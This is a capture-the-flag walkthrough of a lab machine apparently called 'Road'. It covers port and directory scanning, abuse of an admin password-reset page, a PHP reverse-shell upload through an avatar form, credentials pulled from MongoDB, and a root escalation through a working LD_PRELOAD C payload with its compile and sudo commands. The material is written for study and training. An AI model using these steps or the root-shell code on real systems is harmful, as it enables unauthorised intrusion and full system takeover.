# Road
```sh
export IP=M_ip
```
# Enumeration:

```sh
nmap -A -sC -sV $IP
```
```sh
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-05 20:57 CEST
Nmap scan report for 10.10.0.79
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
|_  256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sky Couriers
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# In the first dir bruteforce:

```sh
gobuster dir -u http://10.10.0.79 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```sh
/v2                   (Status: 301) [Size: 305] [--> http://10.10.0.79/v2/]
```
# In the second dir bruteforce:
```sh
gobuster dir -u http://10.10.0.79/v2 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```
```sh
/admin                (Status: 301) [Size: 311] [--> http://10.10.0.79/v2/admin/]
```
visiting /v2/admin:

![Screenshot_25](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/55ac3812-1da6-47f6-be51-f3b26915689d)


I found /ResetUser.php  so i was able to changed admin password in burpsuite, like this : 

![Screenshot_27](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/39a6fd6f-d2c8-44c9-8775-2821fe690832)


By doing this i found upload avatar in the Profile
That might get us to manipulate the php-reverse-shell extension to be .php instead of .jpg 


![Screenshot_26](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/6e2bedaf-595b-4c9e-b760-7e7e3d2ce203)



![Screenshot_28](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/ccfb0248-3d53-49fd-8313-411d09fe0cd9)


This is the dir that has our revshell i found it in the admin  /profile.php  source code 

![Screenshot_29](https://github.com/a-9-k/TryHackMe-Write_Ups/assets/53786047/cb24afb2-0e7a-48e7-ac78-6ea2f4e66395)

# Initial Access:

```sh
nc -lvnp 4444             
listening on [any] 4444 ...
connect to [10.8.46.178] from (UNKNOWN) [10.10.0.79] 37742
Linux sky 5.4.0-73-generic #82-Ubuntu SMP Wed Apr 14 17:39:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 20:02:45 up  1:35,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# stabilize the reverse shell :
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
Press CTRL + Z to background process and get back to your host machine
stty raw -echo; fg
export TERM=xterm
```
# Privilege escalation:
```sh
www-data@sky:/$ ss -tulpn
Netid State  Recv-Q  Send-Q     Local Address:Port    Peer Address:Port Process 
udp   UNCONN 0       0          127.0.0.53%lo:53           0.0.0.0:*            
udp   UNCONN 0       0        10.10.0.79%eth0:68           0.0.0.0:*            
tcp   LISTEN 0       70             127.0.0.1:33060        0.0.0.0:*            
tcp   LISTEN 0       511            127.0.0.1:9000         0.0.0.0:*            
tcp   LISTEN 0       4096           127.0.0.1:27017        0.0.0.0:*            
tcp   LISTEN 0       151            127.0.0.1:3306         0.0.0.0:*            
tcp   LISTEN 0       4096       127.0.0.53%lo:53           0.0.0.0:*            
tcp   LISTEN 0       128              0.0.0.0:22           0.0.0.0:*            
tcp   LISTEN 0       511                    *:80                 *:*            
tcp   LISTEN 0       128                 [::]:22              [::]:*
```
```sh
There is:
port 33060: default port for MYSQL  
port 27017: default port for MongoDB
```

```sh

> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup
switched to db backup
> show collections
collection
user
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "fakePassword" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
> 
```
```sh
ssh webdeveloper@IP 
```
```sh
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```
LD_PRELOAD is an environment variable in Unix-like systems, such as Linux, that allows you to specify additional shared libraries to be loaded before all others.
With this i could write c code script to spawn a root shell ,shell.c
```sh
#include <stdio.h> 
#include <stdlib.h>
#include <unistd.h>

void inject()__attribute__((constructor));

void inject() {
 	unsetenv("LD_PRELOAD");
 	setgid(0);
 	setuid(0);
 	system("/bin/bash");
}
```
# compile the code:
```sh
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
and run
sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
```
```sh
webdeveloper@sky:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
webdeveloper@sky:~$ sudo LD_PRELOAD=/home/webdeveloper/shell.so sky_backup_utility
root@sky:/home/webdeveloper# cd /root
root@sky:~# ls
root.txt
root@sky:~# cat root.txt 
3a62d897c40a8flag
root@sky:~#

```
